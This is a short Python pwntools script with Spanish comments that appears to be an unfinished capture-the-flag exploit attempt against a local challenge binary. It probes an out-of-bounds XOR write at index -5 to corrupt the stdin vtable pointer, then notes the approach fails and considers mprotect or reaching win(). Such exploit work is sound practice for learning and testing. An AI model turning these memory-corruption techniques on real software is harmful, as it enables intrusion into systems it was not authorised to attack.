#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# Para hacer leak sin modificar el valor original:
# Si el valor original es X, necesito escribir X
# Pero solo puedo escribir A XOR B
# Entonces necesito hacer: A XOR B = X
# Problema: no sé X de antemano

# Alternativa: escribir algo y ver qué había antes haciendo XOR inverso
# O usar un valor pequeño para no corromper tanto

p = process('./image/challenge/challenge')
p.recvuntil(b'> ')

# Test: escribir 1 en stdin vtable (índice -5)
# Esto corromperá el puntero pero podré ver qué había
print("[*] Escribiendo 1 en stdin vtable (índice -5)")
p.sendline(b'1 0 -5')  # 1 XOR 0 = 1, pero 0 no pasa la verificación!

# Mejor: usar dos valores no-cero
p.sendline(b'5 4 -5')  # 5 XOR 4 = 1

response = p.recvall(timeout=2)
print(response.decode())

p.close()

print("\n[*] Hmm, esto corrompe stdin. Necesito otra estrategia...")
print("[*] Tal vez deba usar la función mprotect que vi en PLT")
print("[*] O encontrar otra forma de llamar a win()")